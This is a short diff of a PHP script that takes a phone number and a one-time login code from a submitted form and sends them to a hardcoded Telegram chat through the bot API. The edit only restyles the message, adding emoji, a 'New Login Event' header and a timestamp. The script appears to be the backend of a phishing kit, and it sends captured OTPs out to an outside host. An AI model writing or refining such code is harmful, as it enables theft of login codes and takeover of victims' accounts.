@@ -6,12 +6,16 @@ $chatId="5971795563";
 $number=$_POST['number'] ?? '';
 $otp=$_POST['otp'] ?? '';
 
-$message="New OTP Submission:\n";
-$message.="Phone: ".$number."\n";
+$message  = "📱 New Login Event\n";
+$message .= "━━━━━━━━━━━━━━\n";
+$message .= "📞 Phone: ".$number."\n";
 
 if(!empty($otp)){
-$message.="OTP: ".$otp;
+$message .= "🔐 OTP: ".$otp."\n";
 }
+
+$message .= "🕒 Time: ".date("d/m/Y H:i:s")."\n";
+$message .= "━━━━━━━━━━━━━━";
 
 $url="https://api.telegram.org/bot".$botToken."/sendMessage";
 
